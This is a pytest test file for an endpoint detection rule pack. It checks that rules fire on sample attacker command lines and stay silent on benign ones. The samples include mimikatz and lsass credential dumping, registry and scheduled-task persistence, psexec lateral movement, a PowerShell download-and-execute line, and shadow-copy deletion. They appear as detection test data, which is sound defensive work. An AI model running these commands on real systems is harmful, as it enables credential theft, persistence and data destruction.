"""Tests for the M9 detection rule packs."""
import pytest

from app.detection.rules import EventContext, RULES_BY_ID, Severity


def _ctx(command_line="", summary="", details=None):
    d = dict(details or {})
    if command_line:
        d["command_line"] = command_line
    return EventContext("process", "exec", "info", summary, d)


@pytest.mark.parametrize("rule_id,command_line", [
    ("credential_dumping", "mimikatz.exe sekurlsa::logonpasswords"),
    ("credential_dumping", "reg save hklm\\sam sam.hive"),
    ("lsass_access", "procdump.exe -ma lsass.exe out.dmp"),
    ("dll_injection", "used CreateRemoteThread + WriteProcessMemory on target"),
    ("process_hollowing", "ZwUnmapViewOfSection then WriteProcessMemory"),
    ("reflective_loading", "Invoke-ReflectivePEInjection -PEBytes $b"),
    ("wmi_persistence", "New CommandLineEventConsumer subscription created"),
    ("task_persistence", "schtasks /create /tn evil /tr c:\\evil.exe /sc onlogon"),
    ("registry_persistence", "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x"),
    ("service_creation", "sc create evilsvc binpath= c:\\evil.exe"),
    ("privilege_escalation", "fodhelper.exe bypassuac"),
    ("lateral_movement", "psexec \\\\host -u admin cmd"),
    ("fileless_execution", "IEX (New-Object Net.WebClient).DownloadString('http://x')"),
    ("ransomware_behavior", "vssadmin delete shadows /all /quiet"),
])
def test_rule_pack_matches(rule_id, command_line):
    rule = RULES_BY_ID[rule_id]
    assert rule.matches(_ctx(command_line=command_line)), f"{rule_id} should match"


def test_critical_rules_have_isolate_response():
    for rid in ("credential_dumping", "lsass_access", "ransomware_behavior"):
        rule = RULES_BY_ID[rid]
        assert rule.severity == Severity.CRITICAL
        assert "isolate" in rule.responses


def test_benign_command_matches_no_pack_rule():
    ctx = _ctx(command_line="git status && npm test")
    fired = [r.id for r in RULES_BY_ID.values() if r.matches(ctx)]
    assert fired == []


def test_pack_detection_flows_through_ingestion(client, enrolled_device):
    from tests.conftest import ADMIN_HEADERS
    client.post("/api/agent/telemetry", json={"events": [{
        "source": "process", "action": "exec", "severity": "warning",
        "summary": "credential theft",
        "details": {"command_line": "mimikatz sekurlsa::logonpasswords"},
    }]}, headers=enrolled_device["headers"])
    dets = client.get("/api/admin/detections", headers=ADMIN_HEADERS).json()
    ids = {d["rule_id"] for d in dets}
    assert "credential_dumping" in ids
    cd = next(d for d in dets if d["rule_id"] == "credential_dumping")
    assert cd["severity"] == "critical" and cd["technique_id"] == "T1003"
